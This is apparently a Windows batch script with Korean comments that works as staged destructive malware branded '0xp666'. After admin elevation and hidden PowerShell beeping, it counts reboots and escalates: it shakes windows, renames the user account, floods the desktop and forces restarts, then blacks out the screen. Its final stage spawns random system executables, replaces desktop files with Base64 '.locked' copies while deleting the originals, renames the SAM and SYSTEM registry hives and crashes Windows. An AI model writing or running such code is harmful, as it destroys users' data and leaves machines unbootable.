@echo off
setlocal

:: [관리자 권한 승격]
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: [상태 저장]
if not exist "C:\run" mkdir "C:\run"
set "S=C:\run\status.dat"
if not exist "%S%" echo 0 > "%S%"
for /f %%a in (%S%) do set /a cnt=%%a
set /a cnt+=1
echo %cnt% > "%S%"

:: [연출] 0.5초 랜덤 주파수 소음 (Beep)
start /min powershell -WindowStyle Hidden -Command "while($true){ [Console]::Beep((Get-Random -Min 200 -Max 4000), 100); Start-Sleep -m 500 }"

:: ===========================================================
:: [1단계] 실행 즉시! 창 흔들기(발작) + 닉네임 변경 + 도배
:: ===========================================================
if %cnt% equ 1 (
    start /min powershell -WindowStyle Hidden -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class W { [DllImport(\"user32.dll\")] public static extern bool MoveWindow(IntPtr h, int x, int y, int w, int h2, bool r); }'; while($true){ $wins=Get-Process | where {$_.MainWindowHandle -ne 0}; foreach($w in $wins){ [W]::MoveWindow($w.MainWindowHandle, (Get-Random -Min 0 -Max 800), (Get-Random -Min 0 -Max 600), 800, 600, $true) }; Start-Sleep -m 50 }"
    wmic useraccount where name='%username%' rename 0xp666
    powershell -WindowStyle Hidden -Command "for($i=1; $i -le 200; $i++){ New-Item -Path \"$env:USERPROFILE\Desktop\end_$i.txt\" -Value \"END\" -Force }"
    shutdown -r -t 40 -c "0xp666 PHASE 1: SYSTEM SEIZURE"
    exit
)

:: ===========================================================
:: [2단계] 잠식 (화면 블랙아웃 연출)
:: ===========================================================
if %cnt% equ 2 (
    start /min powershell -WindowStyle Hidden -Command "$code = @' [DllImport(\"user32.dll\")] public static extern IntPtr GetDC(IntPtr hwnd); [DllImport(\"gdi32.dll\")] public static extern bool PatBlt(IntPtr hdc, int x, int y, int nw, int nh, uint dwRop); '@; Add-Type -MemberDefinition $code -Name GDI -Namespace Win32; $hdc = [Win32.GDI]::GetDC([IntPtr]::Zero); for($i=0; $i -le 300; $i++){ [Win32.GDI]::PatBlt($hdc, 0, 0, 2000, 2000, 0x42); Start-Sleep -m 50 }"
    shutdown -r -t 15 -f
    exit
)

:: ===========================================================
:: [3단계] 최종 파괴 (Clear-Disk 제외 / 복구 가능 파괴)
:: ===========================================================
if %cnt% geq 3 (
    :: 창 폭격 + 비프음
    start /min powershell -WindowStyle Hidden -Command "$apps = Get-ChildItem 'C:\Windows\System32\*.exe' | Select-Object -ExpandProperty Name; while($true){ $target = $apps | Get-Random; try { Start-Process $target; [Console]::Beep(2000, 100); } catch {}; Start-Sleep -m 300 }"
    
    :: GDI 반전 및 파일 암호화 (.locked / .dead)
    start /min powershell -WindowStyle Hidden -Command "$code = @' [DllImport(\"user32.dll\")] public static extern IntPtr GetDC(IntPtr hwnd); [DllImport(\"gdi32.dll\")] public static extern bool PatBlt(IntPtr hdc, int x, int y, int nw, int nh, uint dwRop); '@; Add-Type -MemberDefinition $code -Name GDI -Namespace Win32; $hdc = [Win32.GDI]::GetDC([IntPtr]::Zero); while($true){ [Win32.GDI]::PatBlt($hdc, (Get-Random -Min 0 -Max 1000), (Get-Random -Min 0 -Max 1000), (Get-Random -Min 100 -Max 500), (Get-Random -Min 100 -Max 500), 0x550009); Start-Sleep -m 10 }"
    
    :: 파일 내용 Base64 변조 (나중에 복구 툴로 해제 가능)
    powershell -WindowStyle Hidden -Command "Get-ChildItem -Path $env:USERPROFILE\Desktop -File -Recurse | ForEach-Object { try { $b=[IO.File]::ReadAllBytes($_.FullName); [IO.File]::WriteAllText($_.FullName + '.locked', [Convert]::ToBase64String($b)); Remove-Item $_.FullName -Force } catch {} }"
    powershell -WindowStyle Hidden -Command "$p='C:\Windows\System32\config'; @('SAM','SYSTEM') | %{ $t=Join-Path $p $_; try { Move-Item $t ($t+'.dead') -Force } catch {} }"

    timeout /t 20 >nul
    powershell wininit
    exit
)
